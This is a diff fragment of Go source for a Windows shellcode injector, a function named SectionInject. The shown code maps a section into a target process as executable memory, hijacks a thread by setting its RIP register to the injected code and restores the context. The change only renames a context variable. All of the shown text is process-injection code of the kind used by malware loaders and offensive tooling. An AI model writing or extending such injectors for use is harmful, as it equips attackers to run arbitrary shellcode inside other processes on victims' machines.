@@ -38,7 +38,7 @@ func SectionInject(target string, shellcode []byte) error {
 	defer procNtClose.Call(uintptr(section))
 	fmt.Printf("  [remote map] 0x%x (RX, PID %d)\n", remoteAddr, pi.ProcessId)
 
-	ctx, err := getThreadContext(pi.Thread)
+	ac, err := getThreadContext(pi.Thread)
 	if err != nil {
 		procNtUnmapViewOfSection.Call(uintptr(windows.CurrentProcess()), localAddr)
 		procNtUnmapViewOfSection.Call(uintptr(pi.Process), remoteAddr)
@@ -46,8 +46,8 @@ func SectionInject(target string, shellcode []byte) error {
 		return err
 	}
 
-	ctx.SetRip(uint64(remoteAddr))
-	if err := setThreadContext(pi.Thread, ctx); err != nil {
+	ac.ctx.SetRip(uint64(remoteAddr))
+	if err := setThreadContext(pi.Thread, ac); err != nil {
 		procNtUnmapViewOfSection.Call(uintptr(windows.CurrentProcess()), localAddr)
 		procNtUnmapViewOfSection.Call(uintptr(pi.Process), remoteAddr)
 		windows.TerminateProcess(pi.Process, 1)
